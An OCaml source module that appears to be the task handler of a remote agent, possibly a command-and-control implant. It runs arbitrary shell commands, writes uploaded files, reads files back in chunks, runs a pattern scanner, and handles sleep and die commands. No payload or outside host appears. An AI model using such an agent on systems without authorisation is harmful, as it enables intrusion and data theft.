let default_chunk_size = 1_048_576

let run_cmd cmd =
  try
    let ic, oc, ec = Unix.open_process_full cmd [||] in
    let stdout_buf = Buffer.create 1024 in
    let stderr_buf = Buffer.create 256 in
    (try
       while true do
         Buffer.add_char stdout_buf (input_char ic)
       done
     with End_of_file -> ());
    (try
       while true do
         Buffer.add_char stderr_buf (input_char ec)
       done
     with End_of_file -> ());
    let status = Unix.close_process_full (ic, oc, ec) in
    let exit_code =
      match status with
      | Unix.WEXITED n -> n
      | Unix.WSIGNALED n -> 128 + n
      | Unix.WSTOPPED n -> 128 + n
    in
    let output =
      Printf.sprintf "%s%s[exit:%d]" (Buffer.contents stdout_buf)
        (let e = Buffer.contents stderr_buf in
         if String.length e > 0 then "\n--- stderr ---\n" ^ e else "")
        exit_code
    in
    [ (Bcheck_codec.Schema.Ok, Bytes.of_string output) ]
  with exn ->
    [ (Bcheck_codec.Schema.Error (Printexc.to_string exn), Bytes.empty) ]

let write_file ~path ~contents =
  try
    let tmp = path ^ ".tmp." ^ string_of_int (Unix.getpid ()) in
    let oc = open_out_bin tmp in
    output_bytes oc contents;
    close_out oc;
    Unix.rename tmp path;
    let msg =
      Printf.sprintf "written %d bytes to %s" (Bytes.length contents) path
    in
    [ (Bcheck_codec.Schema.Ok, Bytes.of_string msg) ]
  with exn ->
    [ (Bcheck_codec.Schema.Error (Printexc.to_string exn), Bytes.empty) ]

let read_file ?(chunk_size = default_chunk_size) path =
  try
    let stat = Unix.stat path in
    let size = stat.st_size in
    let ic = open_in_bin path in
    let rec read_chunks offset acc =
      let remaining = size - offset in
      if remaining <= 0 then (
        close_in ic;
        List.rev acc)
      else
        let n = min chunk_size remaining in
        let buf = Bytes.create n in
        really_input ic buf 0 n;
        read_chunks (offset + n)
          ((Bcheck_codec.Schema.Ok, buf) :: acc)
    in
    read_chunks 0 []
  with exn ->
    [ (Bcheck_codec.Schema.Error (Printexc.to_string exn), Bytes.empty) ]

let scan req =
  let results = Bcheck_matcher.Rules.run req in
  let lines =
    List.map
      (fun (r : Bcheck_matcher.Rules.match_result) ->
        Printf.sprintf "[+] %s:%d (%s) %s" r.file r.line_num r.pattern_name
          r.context)
      results
  in
  let output = String.concat "\n" lines in
  [ (Bcheck_codec.Schema.Ok, Bytes.of_string output) ]

let execute ?(chunk_size = default_chunk_size) = function
  | Bcheck_codec.Schema.Shell cmd -> run_cmd cmd
  | Upload { path; contents } -> write_file ~path ~contents
  | Download path -> read_file ~chunk_size path
  | Scan req -> scan req
  | Sleep _ -> [ (Bcheck_codec.Schema.Ok, Bytes.empty) ]
  | Die -> [ (Bcheck_codec.Schema.Ok, Bytes.of_string "goodbye") ]
